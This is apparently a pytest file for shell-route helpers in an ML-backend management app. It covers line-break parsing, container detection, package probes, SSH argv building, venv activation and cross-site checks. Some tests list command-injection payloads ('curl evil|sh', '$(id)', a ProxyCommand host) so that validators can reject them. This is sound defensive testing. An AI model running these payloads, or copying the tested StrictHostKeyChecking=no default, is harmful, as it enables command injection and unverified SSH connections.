"""Tests for shell_routes.py helpers."""

import builtins
import importlib.util
import json
import os
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from routes.shell_routes import (
    _find_line_break,
    _running_in_container,
    _docker_row_status,
    _package_installed_from_probe,
    _package_modes,
    _package_pip_update_status,
    _package_probe_script,
    _package_status_note,
    _prepend_user_install_bins_to_path,
    _backend_readiness_from_probe,
    _reject_cross_site,
    _ssh_base_argv,
    _venv_activate_prefix,
    DOCKER_IN_CONTAINER_HINT,
)


def test_shell_routes_import_without_posix_pty_modules(monkeypatch):
    """Native Windows has no fcntl/termios; importing routes must still work."""
    real_import = builtins.__import__

    def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
        if name in {"fcntl", "pty"}:
            raise ImportError(f"No module named {name!r}")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    cached_modules = {name: sys.modules.pop(name, None) for name in ("fcntl", "pty")}

    module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
    spec = importlib.util.spec_from_file_location("_shell_routes_without_pty", module_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    finally:
        sys.modules.pop(spec.name, None)
        for name, cached_module in cached_modules.items():
            if cached_module is not None:
                sys.modules[name] = cached_module

    assert module.PTY_SUPPORTED is False
    assert module._find_line_break(b"ok\n") == (2, 1)


async def test_generate_pty_reports_explicit_unsupported_error(monkeypatch):
    """Clients can distinguish unsupported PTY mode from process failures."""
    import routes.shell_routes as shell_routes

    monkeypatch.setattr(shell_routes, "PTY_SUPPORTED", False)
    monkeypatch.setattr(shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'"))

    request = SimpleNamespace(is_disconnected=lambda: False)
    events = [
        json.loads(chunk.removeprefix("data: ").strip())
        async for chunk in shell_routes._generate_pty("echo hi", 5, request)
    ]

    assert events == [
        {
            "stream": "stderr",
            "data": "PTY streaming is not supported on this platform: No module named 'termios'",
            "error": shell_routes.PTY_UNSUPPORTED_ERROR,
        },
        {"exit_code": -1, "error": shell_routes.PTY_UNSUPPORTED_ERROR},
    ]


class TestFindLineBreak:
    """Test line-break detection in byte buffers."""

    def test_newline(self):
        assert _find_line_break(b"hello\nworld") == (5, 1)

    def test_crlf(self):
        assert _find_line_break(b"hello\r\nworld") == (5, 2)

    def test_cr_only(self):
        assert _find_line_break(b"hello\rworld") == (5, 1)

    def test_no_breaks(self):
        assert _find_line_break(b"no breaks") == (-1, 0)

    def test_empty(self):
        assert _find_line_break(b"") == (-1, 0)

    def test_leading_newline(self):
        assert _find_line_break(b"\n") == (0, 1)

    def test_leading_cr(self):
        assert _find_line_break(b"\r") == (0, 1)

    def test_leading_crlf(self):
        assert _find_line_break(b"\r\n") == (0, 2)

    def test_multiple_newlines(self):
        """Should find the first one."""
        assert _find_line_break(b"a\nb\nc") == (1, 1)

    def test_cr_before_newline_not_adjacent(self):
        """\\r at pos 2, \\n at pos 5 — not CRLF, should return \\r pos."""
        assert _find_line_break(b"ab\rcd\n") == (2, 1)

    def test_newline_before_cr(self):
        """\\n comes before \\r — should return \\n."""
        assert _find_line_break(b"ab\ncd\r") == (2, 1)


class TestRunningInContainer:
    """Detect whether the Odysseus process itself runs inside a container."""

    def test_dockerenv_marker_present(self, tmp_path):
        marker = tmp_path / ".dockerenv"
        marker.write_text("")
        assert _running_in_container(
            dockerenv_path=str(marker), cgroup_path=str(tmp_path / "missing"),
        ) is True

    def test_cgroup_names_a_container_runtime(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
        ) is True

    def test_bare_host_has_neither_signal(self, tmp_path):
        cgroup = tmp_path / "cgroup"
        cgroup.write_text("0::/user.slice/session-1.scope\n")
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
        ) is False

    def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
        assert _running_in_container(
            dockerenv_path=str(tmp_path / "no-marker"),
            cgroup_path=str(tmp_path / "also-missing"),
        ) is False


class TestDockerRowStatus:
    """Applicability plus install hint for the docker dependency row."""

    DEFAULT = "Install Docker on the selected server."

    def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=True, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is False
        assert status.install_hint == DOCKER_IN_CONTAINER_HINT

    def test_in_container_but_present_is_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=True, installed=True, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_on_host_and_absent_stays_applicable_with_default_hint(self):
        status = _docker_row_status(
            on_remote=False, in_container=False, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_is_always_applicable_even_when_absent(self):
        status = _docker_row_status(
            on_remote=True, in_container=False, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_remote_server_ignores_local_container_status(self):
        status = _docker_row_status(
            on_remote=True, in_container=True, installed=False, default_hint=self.DEFAULT,
        )
        assert status.applicable is True
        assert status.install_hint == self.DEFAULT

    def test_container_hint_steers_to_remote_and_warns_on_socket(self):
        lowered = DOCKER_IN_CONTAINER_HINT.lower()
        assert "remote" in lowered
        assert "socket" in lowered
        assert "host-root" in lowered or "host root" in lowered


class TestPackageProbeStatus:
    """Dependency rows should reflect serve readiness, not import coincidences."""

    def test_vllm_namespace_without_cli_is_not_installed(self):
        probe = {
            "modules": {
                "vllm": {
                    "found": True,
                    "origin": None,
                    "loader": None,
                    "locations": ["/root/vllm"],
                    "real_module": False,
                }
            },
            "dists": {},
            "binaries": {"vllm": None},
        }

        assert _package_installed_from_probe("vllm", probe) is False
        assert "namespace" in _package_status_note("vllm", probe)
        assert "no vLLM CLI" in _package_status_note("vllm", probe)
        modes = _package_modes("vllm", probe, {"docker": True, "docker_images": ["vllm/vllm-openai:cu130-nightly"]})
        assert {"label": "CLI", "status": "missing", "detail": "No vllm executable on PATH"} in modes
        assert any(mode["label"] == "Docker" and mode["status"] == "ready" for mode in modes)
        assert any(mode["label"] == "Python" and mode["status"] == "warn" for mode in modes)

    def test_vllm_requires_cli_for_current_serve_command(self):
        probe = {
            "modules": {"vllm": {"found": True, "real_module": True}},
            "dists": {"vllm": "0.8.5"},
            "binaries": {"vllm": "/home/user/venv/bin/vllm"},
        }

        assert _package_installed_from_probe("vllm", probe) is True
        assert "python package: vllm 0.8.5" in _package_status_note("vllm", probe)
        assert _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available is True

    def test_vllm_cli_without_dist_is_external_for_update(self):
        probe = {
            "modules": {"vllm": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"vllm": "/opt/vllm/bin/vllm"},
        }

        status = _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe)

        assert _package_installed_from_probe("vllm", probe) is True
        assert status.available is False
        assert "outside Odysseus" in status.note

    def test_llama_cpp_is_installed_when_native_llama_server_exists(self):
        probe = {
            "modules": {"llama_cpp": {"found": False, "real_module": False}},
            "dists": {},
            "binaries": {"llama-server": "/usr/local/bin/llama-server"},
        }

        assert _package_installed_from_probe("llama_cpp", probe) is True
        assert "native llama-server" in _package_status_note("llama_cpp", probe)
        status = _package_pip_update_status({"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe)
        assert status.available is False
        assert "package manager or source checkout" in status.note
        modes = _package_modes("llama_cpp", probe)
        assert modes[0]["label"] == "Native"
        assert modes[0]["status"] == "ready"
        assert modes[1]["label"] == "Python"
        assert modes[1]["status"] == "missing"

    def test_diffusers_requires_torch_too(self):
        missing_torch = {
            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": False}},
            "dists": {"diffusers": "0.37.0"},
            "binaries": {},
        }
        ready = {
            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": True, "real_module": True}},
            "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
            "binaries": {},
        }

        assert _package_installed_from_probe("diffusers", missing_torch) is False
        assert _package_installed_from_probe("diffusers", ready) is True

    def test_local_user_install_bin_is_added_to_path(self, monkeypatch, tmp_path):
        user_base = tmp_path / "user-base"
        monkeypatch.setattr("site.USER_BASE", str(user_base))
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        monkeypatch.setenv("PATH", "/usr/bin")

        _prepend_user_install_bins_to_path()

        parts = os.environ["PATH"].split(os.pathsep)
        assert str(user_base / "bin") in parts
        assert str(tmp_path / "home" / ".local" / "bin") in parts

    def test_remote_package_probe_checks_user_install_bin(self):
        script = _package_probe_script(["vllm"])

        assert "site.USER_BASE" in script
        assert "os.path.expanduser('~/.local/bin')" in script
        assert "add_user_install_bins_to_path()" in script
        assert "shutil.which(b)" in script


class TestSshBaseArgv:
    def test_basic_host_no_port(self):
        assert _ssh_base_argv("user@example.com", None) == [
            "ssh", "-o", "ConnectTimeout=6", "-o", "StrictHostKeyChecking=no",
            "user@example.com",
        ]

    def test_default_port_22_omitted(self):
        assert "-p" not in _ssh_base_argv("h", "22")
        assert "-p" not in _ssh_base_argv("h", "")
        assert "-p" not in _ssh_base_argv("h", None)

    def test_custom_port_added_as_separate_argv(self):
        assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]

    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
    def test_bad_port_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv("h", bad)

    def test_option_injecting_host_rejected(self):
        with pytest.raises(ValueError):
            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)

    @pytest.mark.parametrize("bad", ["", "   ", None])
    def test_empty_host_rejected(self, bad):
        with pytest.raises(ValueError):
            _ssh_base_argv(bad, None)


class TestVenvActivatePrefix:
    def test_empty_returns_blank(self):
        assert _venv_activate_prefix(None) == ""
        assert _venv_activate_prefix("") == ""

    def test_appends_bin_activate(self):
        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "

    def test_already_pointing_at_activate(self):
        assert _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "

    @pytest.mark.parametrize("bad", [
        "/opt/v && curl evil|sh",
        "$(id)",
        "`id`",
        "v;id",
        "v\nid",
        "v|id",
    ])
    def test_injection_payloads_rejected(self, bad):
        with pytest.raises(ValueError):
            _venv_activate_prefix(bad)


class TestRejectCrossSite:
    @staticmethod
    def _req(headers):
        return SimpleNamespace(headers=headers)

    def test_cross_site_rejected(self):
        from fastapi import HTTPException
        with pytest.raises(HTTPException) as exc:
            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
        assert exc.value.status_code == 403

    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
    def test_same_origin_and_direct_nav_allowed(self, site):
        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None

    def test_missing_header_allowed(self):
        assert _reject_cross_site(self._req({})) is None


class TestBackendReadiness:
    """Backend readiness should model launch modes, not just import status."""

    def test_vllm_docker_ready_while_cli_missing_is_partial_capability(self):
        payload = _backend_readiness_from_probe(
            package_details={
                "_meta": {"python": "/venv/bin/python", "prefix": "/venv", "version": "3.13.0", "path": "/venv/bin:/usr/bin"},
                "vllm": {
                    "modules": {
                        "vllm": {
                            "found": True,
                            "origin": None,
                            "loader": None,
                            "locations": ["/root/vllm"],
                            "real_module": False,
                        }
                    },
                    "dists": {},
                    "binaries": {"vllm": None},
                }
            },
            system_details={
                "docker": {
                    "installed": True,
                    "path": "/usr/bin/docker",
                    "docker_images": ["vllm/vllm-openai:cu130-nightly"],
                }
            },
            hardware={"backend": "cuda", "has_gpu": True, "gpu_name": "NVIDIA RTX", "gpu_count": 2, "gpu_vram_gb": 32},
            server={"host": "user@gpu-box", "ssh_port": "22", "venv": "", "platform": "linux"},
        )

        assert payload["hardware"]["gpu_vendor"] == "nvidia"
        assert payload["python"]["executable"] == "/venv/bin/python"
        assert payload["hardware"]["runtime"] == "cuda"
        assert payload["backends"]["vllm"]["modes"]["cli"]["ok"] is False
        assert "namespace" in payload["backends"]["vllm"]["modes"]["cli"]["reason"]
        assert payload["backends"]["vllm"]["modes"]["docker"]["ok"] is True
        assert payload["backends"]["vllm"]["modes"]["docker"]["details"]["images"] == ["vllm/vllm-openai:cu130-nightly"]

    def test_amd_rocm_hardware_maps_to_rocm_runtime(self):
        payload = _backend_readiness_from_probe(
            package_details={},
            system_details={"docker": {"installed": True, "docker_images": ["vllm/vllm-openai-rocm:nightly"]}},
            hardware={"backend": "rocm", "has_gpu": True, "gpu_name": "AMD Radeon", "gpu_count": 1, "gpu_vram_gb": 16},
            server={},
        )

        assert payload["hardware"]["gpu_vendor"] == "amd"
        assert payload["hardware"]["runtime"] == "rocm"
        assert payload["backends"]["vllm"]["modes"]["docker"]["ok"] is True
        assert payload["backends"]["vllm"]["modes"]["docker"]["details"]["images"] == ["vllm/vllm-openai-rocm:nightly"]
        assert payload["backends"]["llama_cpp"]["modes"]["native"]["action"] == "setup_native_llama_cpp"

    def test_native_llama_server_and_python_fallback_are_separate_modes(self):
        payload = _backend_readiness_from_probe(
            package_details={
                "llama_cpp": {
                    "modules": {"llama_cpp": {"found": False, "real_module": False}},
                    "dists": {"llama-cpp-python": "0.3.16"},
                    "binaries": {"llama-server": "/usr/local/bin/llama-server"},
                }
            },
            system_details={},
            hardware={"backend": "metal", "has_gpu": True},
            server={},
        )

        assert payload["hardware"]["gpu_vendor"] == "apple"
        assert payload["backends"]["llama_cpp"]["modes"]["native"]["ok"] is True
        assert payload["backends"]["llama_cpp"]["modes"]["native"]["path"] == "/usr/local/bin/llama-server"
        assert payload["backends"]["llama_cpp"]["modes"]["python"]["ok"] is True
        assert payload["backends"]["llama_cpp"]["modes"]["python"]["version"] == "0.3.16"
